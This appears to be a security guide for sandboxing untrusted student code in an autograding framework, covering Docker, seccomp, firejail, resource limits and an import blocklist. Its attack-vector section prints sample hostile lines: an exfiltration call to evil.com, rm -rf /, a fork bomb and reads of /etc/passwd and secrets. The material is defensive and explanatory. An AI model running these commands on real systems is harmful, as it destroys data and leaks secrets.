# Computor Testing Framework - Security Guide

This document covers security considerations for running untrusted student code in the Computor Testing Framework.

## Current Security Status

### Identified Risks

| Tester | Execution Method | Risk Level | Issues |
|--------|------------------|------------|--------|
| **pytester** | `exec()` in-process | **CRITICAL** | Full Python access, can read env vars, file system, network |
| **ctester** | `subprocess.run()` | **HIGH** | Compiled binary runs with full permissions |
| **octester** | `subprocess.run()` | **HIGH** | Octave process runs with full permissions |
| **rtester** | `subprocess.run()` | **HIGH** | R process runs with full permissions |

### Attack Vectors

Student code can potentially:

1. **Read Environment Variables**
   ```python
   # Python
   import os
   secrets = os.environ
   ```
   ```c
   // C
   #include <stdlib.h>
   char* secret = getenv("API_KEY");
   ```

2. **Read/Write File System**
   ```python
   # Python
   with open('/etc/passwd', 'r') as f:
       print(f.read())
   ```

3. **Network Access**
   ```python
   # Python - exfiltrate data
   import urllib.request
   urllib.request.urlopen('http://evil.com/?data=' + data)
   ```

4. **Fork Bomb / Resource Exhaustion**
   ```python
   # Python
   import os
   while True: os.fork()
   ```
   ```c
   // C
   while(1) fork();
   ```

5. **System Command Execution**
   ```python
   # Python
   import os
   os.system('rm -rf /')
   ```

6. **Read Other Students' Code**
   ```python
   import glob
   for f in glob.glob('/submissions/*'):
       print(open(f).read())
   ```

---

## Docker Sandboxing (Recommended)

### Minimal Secure Dockerfile

```dockerfile
# Dockerfile.sandbox
FROM python:3.12-slim

# Create non-root user
RUN useradd -m -u 1000 -s /bin/bash sandbox

# Install dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc \
    g++ \
    octave \
    r-base \
    && rm -rf /var/lib/apt/lists/*

# Install Python testing framework
COPY ct-testing /opt/ct-testing
RUN pip install --no-cache-dir /opt/ct-testing

# Set up working directory
WORKDIR /sandbox
RUN chown sandbox:sandbox /sandbox

# Switch to non-root user
USER sandbox

# Default command
CMD ["bash"]
```

### Docker Run Security Options

```bash
docker run \
  --rm \
  --user 1000:1000 \
  --read-only \
  --tmpfs /tmp:size=100M,mode=1777 \
  --tmpfs /sandbox:size=50M,mode=1777 \
  --network none \
  --memory 512m \
  --memory-swap 512m \
  --cpus 1 \
  --pids-limit 100 \
  --security-opt no-new-privileges:true \
  --cap-drop ALL \
  -v /path/to/submission:/sandbox/submission:ro \
  -v /path/to/tests:/sandbox/tests:ro \
  -v /path/to/output:/sandbox/output:rw \
  ct-sandbox \
  pytester run -t /sandbox/submission -T /sandbox/tests/test.yaml
```

### Security Options Explained

| Option | Purpose |
|--------|---------|
| `--user 1000:1000` | Run as non-root user |
| `--read-only` | Read-only root filesystem |
| `--tmpfs /tmp` | Writable temp space with size limit |
| `--network none` | No network access |
| `--memory 512m` | Memory limit |
| `--memory-swap 512m` | Prevent swap usage |
| `--cpus 1` | CPU limit |
| `--pids-limit 100` | Prevent fork bombs |
| `--no-new-privileges` | Prevent privilege escalation |
| `--cap-drop ALL` | Drop all Linux capabilities |

---

## Docker Compose for Testing Service

```yaml
# docker-compose.sandbox.yml
version: '3.8'

services:
  tester:
    build:
      context: .
      dockerfile: Dockerfile.sandbox
    user: "1000:1000"
    read_only: true
    tmpfs:
      - /tmp:size=100M,mode=1777
      - /sandbox:size=50M,mode=1777
    networks:
      - none
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M
          pids: 100
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    volumes:
      - type: bind
        source: ./submissions
        target: /sandbox/submission
        read_only: true
      - type: bind
        source: ./tests
        target: /sandbox/tests
        read_only: true
      - type: bind
        source: ./output
        target: /sandbox/output

networks:
  none:
    driver: none
```

---

## Environment Variable Protection

### 1. Don't Pass Host Environment

```python
# BAD - passes all env vars
subprocess.run(cmd, env=os.environ)

# GOOD - explicit minimal environment
subprocess.run(cmd, env={
    'PATH': '/usr/bin:/bin',
    'HOME': '/sandbox',
    'LANG': 'C.UTF-8',
})
```

### 2. Clean Environment in Docker

```dockerfile
# Clear all environment variables
ENV PATH=/usr/bin:/bin
ENV HOME=/sandbox
ENV LANG=C.UTF-8

# Remove common sensitive vars
RUN unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY \
    DATABASE_URL REDIS_URL API_KEY SECRET_KEY
```

### 3. Use Docker Secrets (Not Environment)

```yaml
# docker-compose.yml - for service configs only
services:
  api:
    secrets:
      - db_password
    # Don't pass to sandbox containers!

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

---

## Python-Specific Sandboxing

### RestrictedPython (Partial Protection)

```python
from RestrictedPython import compile_restricted, safe_globals

def execute_restricted(code: str, allowed_names: dict = None):
    """Execute Python code with restrictions."""
    try:
        byte_code = compile_restricted(code, '<student>', 'exec')
    except SyntaxError as e:
        return {"error": f"Syntax error: {e}"}

    # Create restricted globals
    restricted_globals = safe_globals.copy()

    # Add allowed builtins
    restricted_globals['__builtins__'] = {
        'print': print,
        'len': len,
        'range': range,
        'int': int,
        'float': float,
        'str': str,
        'list': list,
        'dict': dict,
        'tuple': tuple,
        'set': set,
        'bool': bool,
        'sum': sum,
        'min': min,
        'max': max,
        'abs': abs,
        'round': round,
        'sorted': sorted,
        'enumerate': enumerate,
        'zip': zip,
        'map': map,
        'filter': filter,
        # Explicitly exclude: open, exec, eval, __import__, compile
    }

    if allowed_names:
        restricted_globals.update(allowed_names)

    local_vars = {}
    exec(byte_code, restricted_globals, local_vars)

    return {"variables": local_vars}
```

**Note**: RestrictedPython alone is NOT sufficient for untrusted code. Always combine with Docker isolation.

### Block Dangerous Imports (Pre-check)

```python
import ast

BLOCKED_MODULES = {
    'os', 'sys', 'subprocess', 'shutil', 'socket', 'urllib',
    'requests', 'http', 'ftplib', 'smtplib', 'telnetlib',
    'ctypes', 'multiprocessing', 'threading', '_thread',
    'signal', 'resource', 'pty', 'fcntl', 'termios',
    'code', 'codeop', 'compile', 'importlib', 'pkgutil',
    '__builtin__', 'builtins', 'gc', 'inspect',
}

def check_dangerous_imports(code: str) -> list:
    """Check for dangerous imports in Python code."""
    issues = []

    try:
        tree = ast.parse(code)
    except SyntaxError:
        return issues

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                module = alias.name.split('.')[0]
                if module in BLOCKED_MODULES:
                    issues.append(f"Blocked import: {alias.name}")

        elif isinstance(node, ast.ImportFrom):
            if node.module:
                module = node.module.split('.')[0]
                if module in BLOCKED_MODULES:
                    issues.append(f"Blocked import from: {node.module}")

        # Check for __import__ calls
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name) and node.func.id == '__import__':
                issues.append("Blocked: __import__() call")

    return issues
```

---

## C/C++ Specific Sandboxing

### Seccomp Filter (Linux)

For C programs, use seccomp to restrict system calls:

```c
// seccomp_filter.c - Wrapper to run with restrictions
#include <seccomp.h>
#include <unistd.h>
#include <sys/prctl.h>

void setup_seccomp() {
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);

    // Allow essential syscalls
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);

    // Block dangerous syscalls
    // fork, clone, execve, socket, etc. are blocked by default (KILL)

    seccomp_load(ctx);
}

int main(int argc, char** argv) {
    setup_seccomp();
    // exec the student program
    execv(argv[1], &argv[1]);
    return 1;
}
```

### Firejail Wrapper

```bash
# Run C programs in firejail
firejail --quiet \
  --private \
  --net=none \
  --no3d \
  --nodvd \
  --nogroups \
  --nonewprivs \
  --nosound \
  --notv \
  --novideo \
  --seccomp \
  --caps.drop=all \
  --rlimit-as=256000000 \
  --rlimit-cpu=10 \
  --rlimit-fsize=10000000 \
  --rlimit-nproc=10 \
  ./student_program
```

---

## Resource Limits

### Python (using resource module)

```python
import resource
import signal

def set_limits():
    """Set resource limits for execution."""
    # CPU time limit (seconds)
    resource.setrlimit(resource.RLIMIT_CPU, (30, 30))

    # Memory limit (bytes) - 256 MB
    resource.setrlimit(resource.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))

    # File size limit (bytes) - 10 MB
    resource.setrlimit(resource.RLIMIT_FSIZE, (10 * 1024 * 1024, 10 * 1024 * 1024))

    # Number of processes
    resource.setrlimit(resource.RLIMIT_NPROC, (10, 10))

    # Number of open files
    resource.setrlimit(resource.RLIMIT_NOFILE, (50, 50))

def timeout_handler(signum, frame):
    raise TimeoutError("Execution timed out")

# Usage in subprocess
subprocess.run(
    cmd,
    preexec_fn=set_limits,
    timeout=30,
)
```

### Using cgroups v2 (Linux)

```bash
# Create cgroup for testing
sudo cgcreate -g cpu,memory,pids:ct-sandbox

# Set limits
echo 100000 | sudo tee /sys/fs/cgroup/ct-sandbox/cpu.max
echo $((256*1024*1024)) | sudo tee /sys/fs/cgroup/ct-sandbox/memory.max
echo 50 | sudo tee /sys/fs/cgroup/ct-sandbox/pids.max

# Run process in cgroup
sudo cgexec -g cpu,memory,pids:ct-sandbox ./student_program
```

---

## Implementation: Secure Executor Module

```python
# security/sandbox.py
"""
Secure sandbox execution module for Computor Testing Framework.
"""

import os
import subprocess
import tempfile
import resource
from typing import Dict, Any, Optional, List
from dataclasses import dataclass


@dataclass
class SandboxConfig:
    """Configuration for sandbox execution."""
    timeout: float = 30.0
    memory_mb: int = 256
    cpu_seconds: int = 30
    max_processes: int = 10
    max_files: int = 50
    max_file_size_mb: int = 10
    network_enabled: bool = False
    writable_paths: List[str] = None
    env_whitelist: List[str] = None


class SandboxExecutor:
    """Execute code in a sandboxed environment."""

    DEFAULT_ENV = {
        'PATH': '/usr/bin:/bin',
        'HOME': '/tmp',
        'LANG': 'C.UTF-8',
        'LC_ALL': 'C.UTF-8',
    }

    def __init__(self, config: SandboxConfig = None):
        self.config = config or SandboxConfig()

    def _get_safe_env(self) -> Dict[str, str]:
        """Get safe environment variables."""
        env = self.DEFAULT_ENV.copy()

        if self.config.env_whitelist:
            for key in self.config.env_whitelist:
                if key in os.environ:
                    env[key] = os.environ[key]

        return env

    def _set_resource_limits(self):
        """Set resource limits (preexec_fn for subprocess)."""
        # CPU time
        resource.setrlimit(
            resource.RLIMIT_CPU,
            (self.config.cpu_seconds, self.config.cpu_seconds)
        )

        # Memory
        mem_bytes = self.config.memory_mb * 1024 * 1024
        resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))

        # File size
        file_bytes = self.config.max_file_size_mb * 1024 * 1024
        resource.setrlimit(resource.RLIMIT_FSIZE, (file_bytes, file_bytes))

        # Processes
        resource.setrlimit(
            resource.RLIMIT_NPROC,
            (self.config.max_processes, self.config.max_processes)
        )

        # Open files
        resource.setrlimit(
            resource.RLIMIT_NOFILE,
            (self.config.max_files, self.config.max_files)
        )

    def run(self, cmd: List[str],
            stdin: str = None,
            cwd: str = None) -> Dict[str, Any]:
        """
        Run a command in the sandbox.

        Args:
            cmd: Command and arguments
            stdin: Input to send to stdin
            cwd: Working directory

        Returns:
            Dictionary with stdout, stderr, return_code, timed_out
        """
        try:
            result = subprocess.run(
                cmd,
                input=stdin,
                capture_output=True,
                text=True,
                timeout=self.config.timeout,
                cwd=cwd,
                env=self._get_safe_env(),
                preexec_fn=self._set_resource_limits,
            )

            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'timed_out': False,
            }

        except subprocess.TimeoutExpired as e:
            return {
                'stdout': e.stdout.decode() if e.stdout else '',
                'stderr': e.stderr.decode() if e.stderr else '',
                'return_code': -1,
                'timed_out': True,
            }

        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'return_code': -1,
                'timed_out': False,
            }
```

---

## Checklist for Production Deployment

### Minimum Requirements

- [ ] Run testers inside Docker containers
- [ ] Use `--network none` to disable network
- [ ] Use `--read-only` filesystem
- [ ] Run as non-root user
- [ ] Set memory limits (`--memory`)
- [ ] Set CPU limits (`--cpus`)
- [ ] Set process limits (`--pids-limit`)
- [ ] Drop all capabilities (`--cap-drop ALL`)
- [ ] Prevent privilege escalation (`--no-new-privileges`)
- [ ] Use clean environment variables
- [ ] Set execution timeouts

### Additional Hardening

- [ ] Use seccomp profiles
- [ ] Mount submissions as read-only
- [ ] Separate container per submission
- [ ] Log all executions
- [ ] Rate limit submissions per user
- [ ] Scan submissions for known attack patterns
- [ ] Use AppArmor/SELinux profiles
- [ ] Regular security audits

### Monitoring

- [ ] Monitor container resource usage
- [ ] Alert on timeout patterns
- [ ] Log stderr for suspicious activity
- [ ] Track execution times
- [ ] Monitor for escape attempts

---

## Implementation Status

The following security measures have been implemented in the Computor Testing Framework:

### Completed ✅

- **Sandbox Module** (`sandbox/`) - Centralized security utilities
  - `SandboxExecutor` - Secure subprocess execution
  - `ResourceLimits` - CPU, memory, process limits
  - `SafeEnvironment` - Clean environment handling
  - Security analysis functions for Python/C/Octave code

- **pytester** - Now uses subprocess instead of in-process `exec()`
  - Subprocess isolation for student code
  - Clean environment variables
  - Resource limits via `preexec_fn`
  - Optional security pre-check for dangerous imports

- **ctester** - Safe environment handling
  - `_get_safe_env()` method filters secrets
  - Resource limits for compiled executables
  - `use_safe_env` parameter (default: True)

- **octester** - Safe environment handling
  - Clean environment for Octave processes
  - Resource limits via `preexec_fn`

- **rtester** - Safe environment handling
  - Clean environment for R processes
  - R library paths preserved safely
  - Resource limits via `preexec_fn`

- **Dockerfile.sandbox** - Pre-built secure container
  - Non-root user
  - Minimal system packages
  - Ready for `--network none`, `--read-only`, etc.

### Usage

```python
from sandbox import SandboxExecutor, SandboxConfig, ResourceLimits

config = SandboxConfig(
    limits=ResourceLimits(
        timeout=30.0,
        memory_bytes=256 * 1024 * 1024,
        max_processes=10,
    ),
    clean_environment=True,
)

with SandboxExecutor(config) as executor:
    result = executor.run(["python3", "student_code.py"])
```

---

## See Also

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [gVisor](https://gvisor.dev/) - Sandboxed container runtime
- [Firecracker](https://firecracker-microvm.github.io/) - MicroVM for serverless
- [nsjail](https://github.com/google/nsjail) - Process isolation tool
- [bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing
